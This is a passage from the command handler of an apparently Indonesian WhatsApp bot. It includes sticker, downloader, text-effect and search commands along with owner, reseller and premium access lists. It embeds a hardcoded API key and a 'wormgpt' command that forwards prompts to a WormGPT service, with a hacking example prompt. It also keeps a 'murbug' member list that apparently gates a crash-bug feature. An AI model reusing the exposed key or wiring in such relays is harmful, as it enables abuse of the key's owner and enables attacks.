let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await qio.sendImageAsSticker(m.chat, res.url, m, { packname: pushname, author: author, categories: res.tags })
await fs.unlinkSync(encmedia);
}
}
break

//Convert 
case 'style': case 'styletext': {
if (!text) return qioreply('Enter *query* text!')
let anu = await styletext(q)
let teks = `Style Text From ${q}\n\n`
for (let i of anu) {
teks += ` ${i.name}* : ${i.result}\n\n`
}
qioreply(teks)
}
break
//=================================================//
case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
qioreply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await qio.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return qioreply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await qio.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case 'smeme': {
 if (!text) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
qioreply(mess.wait)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await qio.downloadAndSaveMediaMessage(qmsg)
let Bjirka = await uptotelegra(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${Bjirka}`
let pop = await qio.sendImageAsSticker(m.chat, smeme, m, {
packname: global.packname,
author: global.author
})
fs.unlinkSync(pop)
}
}
break
//=================================================//
case 'toimage':
case 'toimg': {
if (!/webp/.test(mime)) return m.reply(`Reply sticker dengan caption *${prefix + command}*`)
qioreply(mess.wait)
let media = await qio.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
qio.sendMessage(m.chat, {
image: buffer
}, {
quoted: m
})
fs.unlinkSync(ran)
})

}
break
//=================================================//
case 'toaud':
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Kirim/qioreply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
qioreply(mess.wait)
let media = await qio.downloadMediaMessage(qmsg)
let audio = await toAudio(media, 'mp4')
qio.sendMessage(m.chat, {
audio: audio,
mimetype: 'audio/mpeg'
}, {
quoted: m
})
}
break
//=================================================//
case 'removebg': {
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
qioreply(mess.wait)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await qio.downloadAndSaveMediaMessage(qmsg)
let bjirka = await uptotelegra(dwnld)
var anu = await fetchJson(`https://aemt.me/removebg?url=${bjirka}`)
var hassdl = anu.url.result
await qio.sendMessage(m.chat, {
image: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: m
})
}
}
break
//=================================================//
case 'attp':
if (args.length == 0) return m.reply(global.notext)
await loading()
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄&text=${ini_txt}`)
qio.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break
//=================================================//
case "tinyurl": case "shortlink": {
if (!text) return m.reply(`*Example: ${prefix+command} https://instagram.com/ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄_xploit*`)
let anu = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`)
qioreply(anu.data)
}
break
//=================================================//
case 'remini': case 'hd': case 'hdr': {
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
qioreply(mess.wait)
let media = await quoted.download()
let proses = await remini(media, "enhance");
qio.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m })
}
break
//=================================================//
case 'git': case 'gitclone': {
if (!args[0]) return m.reply(`Mana link nya?\nContoh :\n${prefix ? prefix : '.'}${command} https://github.com/YukiShima4/tes`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
await qioreply(mess.wait)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
qio.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => qioreply(err))
}   
break
//=================================================//
case 'mediafire': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
qioreply(mess.wait)
let anu = await fetchJson(`https://aemt.me/mediafire?link=${q}`)
let hasdl = anu.result.link
let namafile = anu.result.title
qio.sendMessage(m.chat, { document: { url: hasdl }, fileName: namafile, mimetype: '*/*' }, { quoted: m })
}
break
//=================================================//
case 'igdlmp4': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
qioreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/igdl?url=${q}`)
var hassdl = anu.result[0].url
await qio.sendMessage(m.chat, {
video: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: m
})
}
break
//=================================================//
case 'igdlimage': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
qioreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/igdl?url=${q}`)
var hassdl = anu.result.url
await qio.sendMessage(m.chat, {
image: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: m
})
}
break
//=================================================//
case 'pintmp4': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
qioreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/pindl?url=${q}`)
var hassdl = anu.result.url
await qio.sendMessage(m.chat, {
video: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: m
})
}
break
//=================================================//
case 'douyindl': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
qioreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/douyin?url=${q}`)
var hassdl = anu.result.url.nowm
await qio.sendMessage(m.chat, {
video: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: m
})
}
break
//=================================================//
case 'happymod':{
if (!q) return m.reply(`Example ${prefix+command} Sufway surfer mod`)
qioreply (mess.wait)
let kat = await scp1.happymod(q)
qioreply (util.format(kat))
}
break
//=================================================//
case 'play': 
case 'ytaudio':
case 'playmusik':
case 'playmusic': {
if (!q) return qioreply("Kirim perintah judul lagu/link youtube nya bwang")
try {
let rus = await yts(q)
if (rus.all.length == "0") return qioreply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')
try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
try{
var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
} catch(err) {
var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/default.jpg`
}
let inithumb = await getBuffer(thumbnya)
let teks = `*💢 Y O U T U B E - M P 3*

🔶 Channel : ${res.author.name}
🔶 Viewers : ${res.views} Kali
🔶 Duration : ${res.timestamp}
🔶 Url : ${res.url}`

qio.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: false, 
title: `${res.title}`,
body: `${week} ${calender}`,
mediaType: 2,  
renderLargerThumbnail : true,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}}, image: {url: inithumb},text: teks},{quoted: m})
downloadMp3(`${res.url}`) 
} catch (err){
console.log(err)
m.reply(`Server sedang error`)
}
}
break
//=================================================//
case 'ytmp3':
case 'youtubemp3':
case 'youtubeaudio':{
if(!q) return m.reply(`Contoh : ${prefix+command} Link`)
await qioreply(mess.wait)
downloadMp3(text)
}
break
//=================================================//
case 'ytmp4':
case 'youtubevideo':
case 'youtubemp4':{
if(!q) return m.reply(`Contoh : ${prefix+command} Link`)
await qioreply(mess.wait)
downloadMp4(text)
}
break
//=================================================//
case 'tiktok':
case 'tiktokvideo': {
if (!text) return qioreply( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
await qioreply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
qio.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
})
}
break
//=================================================//
case 'tiktokmp3':
case 'tiktokaudio': {
if (!text) return qioreply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
await qioreply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
qio.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
//=================================================//
case 'wm': {
let [teks1, teks2] = text.split`|`
//if (!teks1) return m.reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
//if (!teks2) return m.reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
qioreply(mess.wait)
if (/image/.test(mime)) {
let media = await qio.downloadMediaMessage(quoted)
let encmedia = await qio.sendImageAsSticker(m.chat, media, m, { packname: `${teks1 ? teks1 : global.packname}`, author: `${teks2 ? teks2 : global.author}`  })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return qioreply('Maksimal 10 detik!')
let media = await qio.downloadMediaMessage(qmsg)
let encmedia = await qio.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
} else {
return m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case "kalkulator":{
if (text.split("+")[0] && text.split("+")[1]) {
const nilai_one = Number(text.split("+")[0])
const nilai_two = Number(text.split("+")[1])
m.reply(`${nilai_one + nilai_two}`)
} else if (text.split("-")[0] && text.split("-")[1]) {
const nilai_one = Number(text.split("-")[0])
const nilai_two = Number(text.split("-")[1])
m.reply(`${nilai_one - nilai_two}`)
} else if (text.split("×")[0] && text.split("×")[1]) {
const nilai_one = Number(text.split("×")[0])
const nilai_two = Number(text.split("×")[1])
m.reply(`${nilai_one * nilai_two}`)
} else if (text.split("÷")[0] && text.split("÷")[1]) {
const nilai_one = Number(text.split("÷")[0])
const nilai_two = Number(text.split("÷")[1])
m.reply(`${nilai_one / nilai_two}`)
} else m.reply(`*Example* : ${prefix + command} 1 + 1`)
}
break

//Openai
//=================================================//
case 'wormgpt': {
if (!q) return qioreply (`Example : ${m.prefix + m.command} create code html & css for hack NASA`)
let response = await axios.post('https://wrmgpt.com/v2/chat/completions', {
messages: [{ role: 'user', content: q }],
max_tokens: 820,
}, { headers: { 'x-wormgpt-provider': 'worm_gpt', 'Content-Type': 'application/json' } });

qioreply(response.data.choices[0].message.content);
}
break
//=================================================//
case 'txt2img':{
if (!text) throw qioreply('Masukan Promptnya\nExample:\n1girl, with glasses, in beach')
m.reply(`Proses Ayang`)
try {
let txt = await getBuffer(`https://xzn.wtf/api/txt2img?text=${text}&apikey=${api.skijo}`)
await qio.sendMessage(m.chat, {image: txt, caption: `Done Sayang`},{quoted: m})
 } catch (e) {
qioreply('Gagal Convert Gambar') 
}
}
break
//=================================================//
case 'diffusion': case 'stabledif': case 'diff':{
if (!text) throw m.reply(`Masukan Promptnya\nExample:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
qioreply(mess.wait)
let anu = await diff(text)
let hasil = await processing(anu, "enhance");
qio.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: ${text}`, m)
}
break
//=================================================//=============================//
case "stablediffusion": case "dall-e": {
if (!q) return qioreply (`Example : ${m.prefix + m.command} Gunung Dengan Cuaca Hujan`)
imgurl = `https://aemt.me/stablediffusion?text=${q}`
 qio.sendMessage(m.chat, {
image: {url: imgurl},
caption: 'Nih,Btw klo ngasih ilustrasi yang bener ya'
},{quoted: m })
}  
break
//=================================================//
// Search
case 'google-search':
if (!q) return qioreply (`Example : ${m.prefix + m.command} santet`)
var js = 'https://dikaardnt.com/api/search/google?q=' + encodeURIComponent(q)
fetch(js).then(response => response.json()).then(json => {
if (json && json.result && json.result.length > 0) {
var capt = `❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}
🔎 Search : ${q}
💼 Title : ${json.result[0].title}
🔗 Link : ${json.result[0].originalUrl}`
qio.sendMessage(m.chat, { image: { url: json.result[0].url }, caption: capt }, { quoted: m })
} else {
var capt = `❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}
🔎 Search : ${q}
Maaf, tidak ada hasil yang ditemukan.`
qio.sendMessage(m.chat, capt, { quoted: m })
}
})
break
//=================================================//
case 'google-article': {
if (!q) return qioreply (`Example : ${m.prefix + m.command} ngaceng`)
var js = await fetch(`https://dikaardnt.com/api/search/google/article?q=${q}`)
var json = await js.json()
m.reply(`
❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].link}
📝 Description : ${json[0].description}
`)
}
break
//=================================================//
case 'search-kbbi': {
//inireact();
if (!q) return m.reply(`Example: ${m.prefix + m.command} persuasif`);
var response = await fetch(`https://dikaardnt.com/api/search/kbbi?q=${q}`);
var data = await response.text();
m.reply(`📝 Result : ${data}`)
}
break
//=================================================//
case 'search-apk': {
if (!q) return qioreply (`Example : ${m.prefix + m.command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}

💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
await qio.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break
//=================================================//
case 'search-sticker': {
if (!q) return qioreply (`Example : ${m.prefix + m.command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
m.reply(`
❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`);
}
break
//=================================================//
case 'search-resep': {
//inireact();
if (!q) return m.reply(`Contoh: ${m.prefix + m.command} sambal`);
var response = await fetch(`https://aemt.me/cariresep?query=${q}`);
var data = await response.json();
var result = data.hasil.data.map(item => `${item.judul}: ${item.link}`).join('\n');
m.reply(`🔍 *query*: ${q}
📝 Hasil Pencarian:
${result}`);
}
break

//=================================================//
case 'addzxcwords': {
if (!isPrem) return qioreply(mess.prem)
if (!text) return m.reply(`Penggunaan ${prefix+command} anjing`)
addzxcwords(text)
}
break
//=================================================//
case 'deletezxcwords': case 'delzxcwords': {
if (!isPrem) return qioreply(mess.prem)
if (!text) return m.reply(`Penggunaan ${prefix+command} anjing`)
deletezxcwords(text)
}
break
//=================================================//
case "addowner":
if (!isDeveloper) return 
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
target = text.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await qio.onWhatsApp(target + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
orgkaya.push(target)
fs.writeFileSync('./owner.json', JSON.stringify(orgkaya))
m.reply(`Nomor ${target} Telah Menjadi Owner!!!`)
await sleep(3500)
qio.sendMessage(prem1 + '@s.whatsapp.net', {
image: { url: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg' },
caption: 'Kamu sekarang adalah Owner!!'
}, { quoted: m })
break


case "delowner":
if (!isDeveloper) return
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
target = text.split("|")[0].replace(/[^0-9]/g, '')
unp = orgkaya.indexOf(ya)
orgkaya.splice(unp, 1)
fs.writeFileSync('./owner.json', JSON.stringify(orgkaya))
m.reply(`Nomor ${target} Telah Di Hapus Owner!!!`)
break
//=================================================//
case 'addseller':
if (!isDeveloper) return
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
var prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
orgkaya.push(prem1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/seller.json', JSON.stringify(orgkaya))
m.reply(`${prem1} Sudah menjadi orgkaya!!!`)
await sleep(3500)
qio.sendMessage(prem1 + '@s.whatsapp.net', {
image: { url: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg' },
caption: 'Kamu sekarang adalah Reseller!!'
}, { quoted: m })
break
//=================================================//
case 'delseller':
if (!isDeveloper) return 
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = orgkaya.indexOf(prem2)
orgkaya.splice(unp, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/seller.json', JSON.stringify(orgkaya))
m.reply(`${prem2} Tidak lagi Reseller!!!`)
break

case 'addprem':
if (!isDeveloper) return
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
var prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
orgkaya.push(prem1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/premium.json', JSON.stringify(orgkaya))
m.reply(`${prem1} Sudah menjadi orgkaya!!!`)
await sleep(3500)
qio.sendMessage(prem1 + '@s.whatsapp.net', {
image: { url: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg' },
caption: 'Kamu sekarang adalah User Premium!!'
}, { quoted: m })
break
//=================================================//
case 'delprem':
if (!isDeveloper) return 
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = orgkaya.indexOf(prem2)
orgkaya.splice(unp, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/premium.json', JSON.stringify(orgkaya))
m.reply(`${prem2} Tidak lagi Premium User!!!`)
break

case "aksesmurbug":
if (!isDeveloper) return
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
var prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
orgkaya.push(prem1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/murbug.json', JSON.stringify(orgkaya))
m.reply(`${prem1} Telah Menjadi anggota murbug!!!`)
await sleep(3500)
qio.sendMessage(prem1 + '@s.whatsapp.net', {
image: { url: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg' },
caption: 'Kamu sekarang adalah Anggota Murbug!!'
}, { quoted: m })
break


case "delaksesmurbug":
if (!isDeveloper) return 
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = orgkaya.indexOf(prem2)
orgkaya.splice(unp, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/murbug.json', JSON.stringify(orgkaya))
m.reply(`${prem2} Telah Di Hapus dari anggota murbug!!!`)
break


//Scrapper
case "kill":case "pat":case "lick":case "bite":case "yeet":case "bonk":case "wink":case "poke":case "nom":case "slap":case "smile":case "wave":case "blush":case "smug":case "glomp":case "happy":case "dance":case "cringe":case "highfive":case "handhold": {
qioreply(mess.wait)
let bugil = `✅Succes, Tapi Lu jan ngaceng Woi`
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
qio.sendMessage(m.chat, {
image: {url: data.url },
caption: '😋 Istri Kartun :3'
},{quoted: m })
})
}
break
//=================================================//
case 'neko':
case 'waifu':
case 'shinobu':
case 'megumin':{
qioreply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
qio.sendMessage(m.chat, { image: {url: data.url }, caption: '✅Succes, Tapi Lu jan ngaceng Woi' },{quoted: m })
})
}
break
//=================================================//
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!q) return m.reply(`Example : ${prefix+command} Alwaysaqio`) 
qioreply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
qio.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
qioreply(mess.wait)
if (!q) return m.reply(`Example : ${prefix+command} Alwaysaqio`) 
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
qio.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
